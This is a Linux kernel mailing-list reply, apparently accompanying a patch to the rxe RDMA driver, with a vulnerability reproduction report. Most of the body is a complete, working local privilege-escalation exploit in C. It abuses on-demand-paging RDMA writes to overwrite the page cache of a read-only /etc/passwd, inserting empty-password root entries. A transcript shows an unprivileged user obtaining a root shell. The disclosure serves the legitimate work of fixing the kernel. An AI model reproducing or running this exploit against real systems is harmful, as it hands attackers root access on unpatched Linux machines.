Received: from mail-ej1-f54.google.com (mail-ej1-f54.google.com [209.85.218.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CDE4825D527
	for <linux-rdma@vger.kernel.org>; Sun, 26 Jul 2026 13:10:23 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.218.54
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785071425; cv=pass; b=rZjyIlGfJPNc2UCKOBjcWehviRlTEN4bIdl9by2vYO3jIsTDJIyuRM0igNjAL55GVg1eWaUGPCmyTsMukWNJ7f+Q3RoZlX8fa8U0v/2pqfb8D6Wa9Qfv0axfrvLR+U6Vmn17WPcWtfPnqJwUS/3l/FC+/HL0TWuQk7GDaftKAY0=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785071425; c=relaxed/simple;
	bh=e8RlADi5zfDo2/g1jdxbbCFtFpXFi66m8JH3cqzh/QA=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=ssOHrXjBQO6wou3zR3AmL9/0u46tOu++apoLEzi+5tAblTOEbgCwEHENay7+51aMs+jdPi5gg2lJZST7nFX/FVP11C15M6SACVTZnZ9Q6dZMLrRj/8Gv4ZWTxdYLNtTxiBA4wHi7wO+jQPzVFuPEIXsmEnwBEtdh1btTH8p+7D0=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=SYsBimhb; arc=pass smtp.client-ip=209.85.218.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="SYsBimhb"
Received: by mail-ej1-f54.google.com with SMTP id a640c23a62f3a-c197e7e4e94so334718066b.2
        for <linux-rdma@vger.kernel.org>; Sun, 26 Jul 2026 06:10:23 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785071422; cv=none;
        d=google.com; s=arc-20260327;
        b=dlv0qydtHjOPT5TSXTIZikp8TEuKAn3G+SldrQtkEfdYkwm9mckvpqv1KaXVJDMCRK
         nHU9NXPBGHquK40dvzCEirxktcVOD+dmh6hb0+cj5C/CX8Qghd/h/hwWbD6fyVihclSt
         siNz+IMvbVPhlKH7xadJy+y+BE2/3sC4Ywsb/YxFwr0pVNroDpsNBh9LR8x//m1bOpFJ
         nuEpd29O+/xTRyagqTsBY6E56dkhp+oPGTBvXhlC0dawZ9N0mWcFZS9cxGauYN5fsDs5
         w2hLY/usf4rkZnQ8fZyReFuE2fKLe3iiobjD/+NVT+78kOAZqL2iR7rgNqOKdugGq1J9
         Q7ow==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:dkim-signature;
        bh=+NrWYl3pQgERZ4te8bar8G94oeCnqqmmaJEyqJ0e/c4=;
        fh=8V+uV91gSm3KLGeWyYZSn1szwMs87Kx04DrFgs8J5W8=;
        b=EcraYZ7z7dzkdSr1S1Iw4mM5UshlXmEakzHTVKmgTRIlUgd+18WbJknARyoGAvFXTi
         peKs2EbJCJwQVNXW+pvxm1+p87WViR7f4jv37LxewrHubbpTGPl2Qxpg6PZR18tgqUdK
         9q/vq2ELaWDfzYC/9xzpzcfzaEacqPUydpwi4won94ZK/9vMoqSSnAFU0v/XFbgC3kr2
         vnuE1PBGjekXLROg4Tm/uxxPQ3Odiu00v5JEQBQkGKbKpR5PNQD3rRvbxw4g0GeMi6vv
         SdhtuFvZGEJ6WThuBMX4uixRUUyvg0SY0dh5Aqy9zJIVL90RFyTPMK56JcC6bvUqD5s8
         7hQQ==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785071422; x=1785676222; darn=vger.kernel.org;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=+NrWYl3pQgERZ4te8bar8G94oeCnqqmmaJEyqJ0e/c4=;
        b=SYsBimhbEXPOWmwzpGey8FEj825Fu8YF1FP813jFiEPGiUh0hEm0rGG11w/lcz7c4k
         Vie5zJy747FYsDP/VJ8OnCDDamCrYq5Abu3d4d6qtN/TGJoP996QqEHPNEMrRnD1KeLd
         hkwgQCYFLAUE+FyOpnrMiYUz7s0qj+BF23p9dfbGa+jDQ5pFdmEGJz7ahkBfGDBkj0jX
         /hohfqQ9tbYu1m8iDFDRrY5t0+Dv3SjP4w2T7SpVBfqFkbmaAj7ESwyurlVMwBJcVBPd
         D3XDT15NCq6rnUWRYzsbFnK63YDIBtBVihcOuY2byT8iVMoIonGo9tvu3rIi/Uj57TOc
         Vg8Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785071422; x=1785676222;
        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=+NrWYl3pQgERZ4te8bar8G94oeCnqqmmaJEyqJ0e/c4=;
        b=b7h7cxCkzV/K97dkocpH9GmLrhE6kZ7PuqDkr3ydvEhzyXSwwn4r1SsvmOdYwmjunq
         P6+Ze+S6UZLwfh+OFZ/EAP5wFIxUNpnfh5VJ6HpFNNS1MapE6pKlaphfP0nGwYPSI5bW
         4P7dVxxbd8H8N2T6siChXXnnVn3M1Loc5GZnNenbMGuxmk/Zk9y1UgNglMLW9nAFiz3E
         lVQSfzx5aw5I/OoreluBJf9vhpGr7d6jUCFbcifaHZS6bHFK5vboleA/8vqBiptmbRO7
         Qvhe1Cjn8AROgUfs1lhLZiH99SD5ZKOVKUMvyk1N+Cp61yPWjxtqVderC0YhdTA5Vz7Y
         mhKA==
X-Gm-Message-State: AOJu0YxVzu3GQbC/y9zPx4ipEayTnLu7jtoByWVG0HYXOlhoXrxa6PBK
	J4pgs9z2jT/WphjntSrrDzA1iH+B/rA+3hDdVmDZkuObvqeLC1kFgyWzQw+yyI3l8D68ndUf2iC
	JaRw5tjDltIM8GbZoLzRlC1fE9zZbjKKbNQ8pEhbA/w==
X-Gm-Gg: AR+sD10/FPoVKDICBhFIiezbV0HKhy+nSgHwVeN34G1MwkVIYn2tOhTIH7RejcpaKHi
	2Pr1pzB9hTe2puIpvpHOvNRfbonZAbhvSUOeIaxref7CDbbBHNVg2oxPYgCTjnU09+dklQ+mvse
	XQwb14nHaMEvpnC+kiwsqLcG6pmTYHiGZYURUxSvz2IBcB0p9nsSGFmEVgGwuR+0AgmyheDCpo6
	6gSlpHc6uuV3OHoe02roXuX3gjTtnzGhe1WC/3TVWA9WQBtVBrysPYoX2HcoeMbcXIel2ly6Csn
	y8PnypMIKd8mK8q0FEM=
X-Received: by 2002:a17:906:8d8b:b0:c16:318:34e3 with SMTP id
 a640c23a62f3a-c1f1ecec83fmr200316466b.16.1785071421608; Sun, 26 Jul 2026
 06:10:21 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260726111533.1037819-1-bestswngs@gmail.com>
In-Reply-To: <20260726111533.1037819-1-bestswngs@gmail.com>
From: Weiming Shi <bestswngs@gmail.com>
Date: Sun, 26 Jul 2026 21:09:43 +0800
X-Gm-Features: AUfX_myGPD2tvruCJ4RtaMf4dbyUqyzgOyHtVhy51_AAvoAb0s8Qc77OUNG0uJk
Message-ID: <CANgPUi23n7XQJdtfitQLZ_1AwQPrL-xBR5Q6OHoF9sCARPuwrw@mail.gmail.com>
Subject: Re: [PATCH] RDMA/rxe: Restore HMM_PFN_WRITE check in ODP write paths
To: linux-rdma@vger.kernel.org
Cc: Jason Gunthorpe <jgg@nvidia.com>, Zhu Yanjun <yanjun.zhu@linux.dev>, 
	Leon Romanovsky <leon@kernel.org>, Hongqiang Luo <wanbafv@gmail.com>, Xinyu Ma <mmmxny@gmail.com>, 
	Shaomin Chen <eeesssooo020@gmail.com>, Rui Ding <threonine42@gmail.com>, 
	Miao Zhao <muel@nova.gal>
Content-Type: text/plain; charset="UTF-8"

Reproduction Steps:

1. Requirements

```
CONFIG_RDMA_RXE=y
CONFIG_INFINIBAND_ON_DEMAND_PAGING=y   # default when INFINIBAND_USER_MEM=y
```

2 . prepare

```bash
modprobe rdma_rxe
rdma link add rxe0 type rxe netdev enp2s0  # enp2s0 is your network devices
```

3. Build  the PoC,then run it we will gain root shell.

```
gcc -O2 -o poc poc.c -libverbs
```
Run the PoC as an unprivileged user; it overwrites /etc/passwd's
        page cache (target file must be at least 512 bytes, true on any
        real system) and an empty-password root entry is installed:

```bash
bash-5.3$ ./poc /etc/passwd lpe
[*] target=/etc/passwd first 32 bytes before: root:x:0:0:Super User:/root:/bin
[*] using device rxe0
[+] ODP MR registered on PROT_READ file mapping: rkey=0x16b5
[*] payload src first 64 bytes: attacker::0:0::/root:/bin/sh
root::0:0::/root:/bin/sh
testuser:x
[*] trying gid_index=1 gid=0000:...fb
[+] QPs connected
[+] RDMA WRITE completed without faulting the read-only mapping
[*] victim mmap first 64 bytes after write: attacker::0:0::/root:/bin/sh
root::0:0::/root:/bin/sh
testuser:x
[*] victim[128..176] after write: :adm:/var/adm:/usr/sbin/nologin
lp:x:4:7:lp:/var
[+] SUCCESS: page cache of read-only file /etc/passwd overwritten!
[+] first 64 bytes now: attacker::0:0::/root:/bin/sh
root::0:0::/root:/bin/sh
testuser:x

bash-5.3$
bash-5.3$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-5.3$ su root
sh-5.3# id
uid=0(attacker) gid=0(root) groups=0(root)
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

PoC:
```c
// PoC: rxe ODP writes into a read-only-mapped page-cache page
(Dirty-COW-class).
// Unprivileged user: ibv_reg_mr(IBV_ACCESS_ON_DEMAND|REMOTE_WRITE) over a
// PROT_READ/MAP_PRIVATE file mapping, then RDMA WRITE lands in the page cache.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <infiniband/verbs.h>

#define PGSZ 4096

static void die(const char *m) { perror(m); exit(1); }

static int gid_is_v4mapped(const union ibv_gid *g)
{
    return !memcmp(g->raw, "\0\0\0\0\0\0\0\0\0\0\xff\xff", 12) &&
           g->raw[12];
}

/* collect RoCE v2 gid indexes; IPv4-mapped gids first (their dmac
 * resolution is trivial for a local self-connect, while fe80::/64
 * link-local can fail ib_resolve_eth_dmac() with -ETIMEDOUT) */
static int collect_rocev2_gids(struct ibv_context *ctx, const char *devname,
                               union ibv_gid *gids, int *idxs, int maxn)
{
    char path[512], type[64];
    int n = 0;
    for (int pass = 0; pass < 2; pass++) {
        for (int i = 0; i < 32 && n < maxn; i++) {
            snprintf(path, sizeof(path),

"/sys/class/infiniband/%s/ports/1/gid_attrs/types/%d", devname, i);
            int fd = open(path, O_RDONLY);
            if (fd < 0)
                break;
            int r = read(fd, type, sizeof(type) - 1);
            close(fd);
            if (r <= 0 || !strstr(type, "v2"))
                continue;
            union ibv_gid g;
            if (ibv_query_gid(ctx, 1, i, &g))
                continue;
            int v4 = gid_is_v4mapped(&g);
            if ((pass == 0 && v4) || (pass == 1 && !v4)) {
                gids[n] = g;
                idxs[n] = i;
                n++;
            }
        }
    }
    return n;
}

static struct ibv_qp *make_qp(struct ibv_pd *pd, struct ibv_cq *cq)
{
    struct ibv_qp_init_attr qa = {
        .send_cq = cq, .recv_cq = cq,
        .cap = { .max_send_wr = 16, .max_recv_wr = 16,
                 .max_send_sge = 4, .max_recv_sge = 4 },
        .qp_type = IBV_QPT_RC,
    };
    struct ibv_qp *qp = ibv_create_qp(pd, &qa);
    if (!qp) die("ibv_create_qp");
    return qp;
}

static void qp_init(struct ibv_qp *qp)
{
    struct ibv_qp_attr a = {0};
    a.qp_state = IBV_QPS_INIT;
    a.pkey_index = 0;
    a.port_num = 1;
    a.qp_access_flags = IBV_ACCESS_REMOTE_WRITE | IBV_ACCESS_REMOTE_READ |
                        IBV_ACCESS_REMOTE_ATOMIC;
    int rc = ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_PKEY_INDEX |
                      IBV_QP_PORT | IBV_QP_ACCESS_FLAGS);
    if (rc) { fprintf(stderr, "modify INIT: %s (%d)\n", strerror(rc),
rc); exit(1); }
}

/* returns 0 on success, else the verbs error code (retryable with
another gid) */
static int qp_to_rts(struct ibv_qp *qp, uint32_t dest_qp_num,
                     union ibv_gid gid, int gid_index)
{
    struct ibv_qp_attr a = {0};
    int rc;

    a.qp_state = IBV_QPS_RTR;
    a.path_mtu = IBV_MTU_1024;
    a.dest_qp_num = dest_qp_num;
    a.rq_psn = 0;
    a.max_dest_rd_atomic = 16;
    a.min_rnr_timer = 12;
    a.ah_attr.is_global = 1;
    a.ah_attr.dlid = 0;
    a.ah_attr.sl = 0;
    a.ah_attr.src_path_bits = 0;
    a.ah_attr.port_num = 1;
    a.ah_attr.grh.dgid = gid;
    a.ah_attr.grh.sgid_index = gid_index;
    a.ah_attr.grh.hop_limit = 255;
    rc = ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU |
                      IBV_QP_DEST_QPN | IBV_QP_RQ_PSN |
IBV_QP_MAX_DEST_RD_ATOMIC |
                      IBV_QP_MIN_RNR_TIMER);
    if (rc)
        return rc;

    memset(&a, 0, sizeof(a));
    a.qp_state = IBV_QPS_RTS;
    a.sq_psn = 0;
    a.timeout = 14;
    a.retry_cnt = 7;
    a.rnr_retry = 7;
    a.max_rd_atomic = 16;
    { int rc = ibv_modify_qp(qp, &a, IBV_QP_STATE | IBV_QP_TIMEOUT |
IBV_QP_RETRY_CNT |
                      IBV_QP_RNR_RETRY | IBV_QP_SQ_PSN |
IBV_QP_MAX_QP_RD_ATOMIC);
      if (rc) { fprintf(stderr, "modify RTS: %s (%d)\n", strerror(rc),
rc); exit(1); } }
    return 0;
}

static void poll_ok(struct ibv_cq *cq)
{
    struct ibv_wc wc;
    int n;
    int tries = 0;
    do {
        n = ibv_poll_cq(cq, 1, &wc);
        if (n < 0) die("poll_cq");
        if (++tries > 1000000) { fprintf(stderr, "poll timeout\n"); exit(1); }
    } while (n == 0);
    if (wc.status != IBV_WC_SUCCESS) {
        fprintf(stderr, "WC error: %s (%d)\n",
ibv_wc_status_str(wc.status), wc.status);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    const char *target = argc > 1 ? argv[1] : "/etc/passwd";
    int lpe = argc > 2 && !strcmp(argv[2], "lpe");

    /* 1. victim page-cache page, read-only, pre-populated */
    int fd = open(target, O_RDONLY);
    if (fd < 0) die("open target");
    char *victim = mmap(NULL, PGSZ, PROT_READ, MAP_PRIVATE, fd, 0);
    if (victim == MAP_FAILED) die("mmap");
    madvise(victim, PGSZ, MADV_WILLNEED);
    volatile char sink = victim[0]; /* install RO PTE pointing at page cache */
    (void)sink;

    char *orig = malloc(PGSZ);
    memcpy(orig, victim, PGSZ);
    printf("[*] target=%s first 32 bytes before: %.32s\n", target, victim);

    /* 2. open rxe */
    struct ibv_device **dl = ibv_get_device_list(NULL);
    if (!dl) die("ibv_get_device_list");
    struct ibv_context *ctx = NULL;
    const char *devname = NULL;
    for (int i = 0; dl[i]; i++)
        if (!strncmp(ibv_get_device_name(dl[i]), "rxe", 3)) {
            devname = ibv_get_device_name(dl[i]);
            ctx = ibv_open_device(dl[i]);
            break;
        }
    if (!ctx) { fprintf(stderr, "no rxe device\n"); return 1; }
    printf("[*] using device %s\n", devname);

    struct ibv_pd *pd = ibv_alloc_pd(ctx);
    if (!pd) die("alloc_pd");
    struct ibv_cq *cq = ibv_create_cq(ctx, 64, NULL, NULL, 0);
    if (!cq) die("create_cq");

    /* 3. THE malicious object: ODP MR with full perms over a
PROT_READ mapping */
    struct ibv_mr *vmr = ibv_reg_mr(pd, victim, PGSZ,
        IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE |
        IBV_ACCESS_REMOTE_READ | IBV_ACCESS_ON_DEMAND);
    if (!vmr) die("reg_mr ODP victim");
    printf("[+] ODP MR registered on PROT_READ file mapping:
rkey=%#x\n", vmr->rkey);

    /* 4. payload source MR (plain anonymous) */
    char *src = mmap(NULL, PGSZ, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (src == MAP_FAILED) die("mmap src");
    memcpy(src, orig, PGSZ);
    if (lpe) {
        /* replace the whole file; readers stop at EOF so NUL padding is safe */
        const char *hdr =
            "attacker::0:0::/root:/bin/sh\n"
            "root::0:0::/root:/bin/sh\n"
            "testuser:x:1000:1000:test:/home/testuser:/bin/sh\n";
        memcpy(src, hdr, strlen(hdr));
    } else {
        memcpy(src, "PWNED-via-rxe-ODP-CoW-bypass", 28); /* marker
inside the file */
    }
    struct ibv_mr *smr = ibv_reg_mr(pd, src, PGSZ, IBV_ACCESS_LOCAL_WRITE);
    if (!smr) die("reg_mr src");
    printf("[*] payload src first 64 bytes: %.64s\n", src);

    /* 5. two RC QPs self-connected over own GID;
     * try each RoCEv2 gid (IPv4-mapped first) until dmac resolution succeeds */
    union ibv_gid gids[32];
    int idxs[32];
    int ngids = collect_rocev2_gids(ctx, devname, gids, idxs, 32);
    if (!ngids) { fprintf(stderr, "no RoCEv2 gid found\n"); return 1; }

    int connected = 0, last_rc = 0;
    struct ibv_qp *qa = NULL, *qb = NULL;
    for (int i = 0; i < ngids && !connected; i++) {
        printf("[*] trying gid_index=%d gid=%02x%02x:...%02x\n",
               idxs[i], gids[i].raw[0], gids[i].raw[1], gids[i].raw[15]);
        qa = make_qp(pd, cq);
        qb = make_qp(pd, cq);
        qp_init(qa);
        qp_init(qb);
        last_rc = qp_to_rts(qa, qb->qp_num, gids[i], idxs[i]);
        if (!last_rc)
            last_rc = qp_to_rts(qb, qa->qp_num, gids[i], idxs[i]);
        if (last_rc) {
            ibv_destroy_qp(qa);
            ibv_destroy_qp(qb);
            qa = qb = NULL;
            continue;
        }
        connected = 1;
    }
    if (!connected) {
        fprintf(stderr, "QP connect failed: %s (%d)\n",
strerror(last_rc), last_rc);
        return 1;
    }
    printf("[+] QPs connected\n");

    /* 6. RDMA WRITE from qa straight into the victim MR (on responder qb).
     * a single sub-MTU write; rxe reassembles multi-packet writes unreliably
     * and the victim file fits in one write anyway */
    {
        struct ibv_sge sge = {
            .addr = (uintptr_t)src, .length = 512, .lkey = smr->lkey,
        };
        struct ibv_send_wr wr = {
            .opcode = IBV_WR_RDMA_WRITE,
            .send_flags = IBV_SEND_SIGNALED,
            .sg_list = &sge, .num_sge = 1,
            .wr.rdma = { .remote_addr = (uintptr_t)victim, .rkey = vmr->rkey },
        }, *bad = NULL;
        if (ibv_post_send(qa, &wr, &bad)) die("post_send");
        poll_ok(cq);
    }
    printf("[+] RDMA WRITE completed without faulting the read-only mapping\n");
    sleep(1); /* let the responder land the write */
    printf("[*] victim mmap first 64 bytes after write: %.64s\n", victim);
    printf("[*] victim[128..176] after write: %.48s\n", victim + 128);
    /* 7. verify: independent reader sees modified file content */
    off_t fsz = lseek(fd, 0, SEEK_END);
    size_t cmp = fsz > 0 && fsz < PGSZ ? (size_t)fsz : PGSZ;
    int fd2 = open(target, O_RDONLY);
    if (fd2 < 0) die("reopen");
    char *now = calloc(1, PGSZ);
    ssize_t nrd = pread(fd2, now, cmp, 0);
    if (nrd != (ssize_t)cmp) die("pread");
    if (memcmp(orig, now, cmp) == 0) {
        printf("[-] primitive FAILED: file page cache unchanged\n");
        return 1;
    }
    printf("[+] SUCCESS: page cache of read-only file %s
overwritten!\n", target);
    printf("[+] first 64 bytes now: %.64s\n", now);

    /* keep the page hot briefly so an orchestrating script can act on it */
    sleep(5);
    return 0;
}

```
